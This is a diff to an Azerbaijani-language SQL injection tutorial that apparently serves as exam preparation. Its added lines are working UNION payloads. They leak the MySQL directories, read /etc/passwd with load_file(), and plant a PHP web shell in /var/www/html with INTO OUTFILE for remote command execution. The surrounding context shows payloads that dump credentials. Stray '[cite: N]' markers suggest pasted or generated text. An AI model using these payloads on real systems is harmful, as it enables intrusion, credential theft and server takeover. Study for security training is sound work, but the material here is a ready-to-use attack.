@@ -83,6 +83,8 @@ Tutaq ki, ekranda `2` rəqəmi əks olunub. İndi verilənlər bazasının adın
 -1' UNION SELECT 1,version(),3-- -  (MySQL/PostgreSQL üçün)
 -1' UNION SELECT 1,@@version,3-- -  (MSSQL üçün)
 
+-1' UNION SELECT 1, @@basedir, @@datadir, 4-- -  -- Bazanın və məlumat qovluğunun yerini tapmaq üçün [cite: 27]
+
 ```
 
 ### Addım D: Cədvəl Adlarının Tapılması (Table Enumeration)
@@ -117,6 +119,15 @@ Son addım olaraq istifadəçi adlarını və şifrələrini ekrana yazdırırı
 ```
 
 * `group_concat()` -> Bütün sətirləri tək bir sətirdə birləşdirib ekranda göstərir, imtahanda vaxta qənaət edir.
+
+
+# A. Sistemdən Lokal Faylların Oxunması (LOAD_FILE) [cite: 46]
+# Əgər bazanın File_priv icazəsi varsa, serverdəki faylları oxuya bilərik[cite: 47]:
+-1' UNION SELECT 1, load_file('/etc/passwd'), 3, 4-- - [cite: 48]
+
+# B. Serverə Fayl Yazmaq və RCE (INTO OUTFILE) [cite: 49, 50]
+# Web qovluğunun yolunu biliriksə, birbaşa webshell yarada bilərik[cite: 50]:
+-1' UNION SELECT 1, '<?php system($_GET["cmd"]); ?>', 3, 4 INTO OUTFILE '/var/www/html/shell.php'-- - [cite: 51]
 
 ```
 
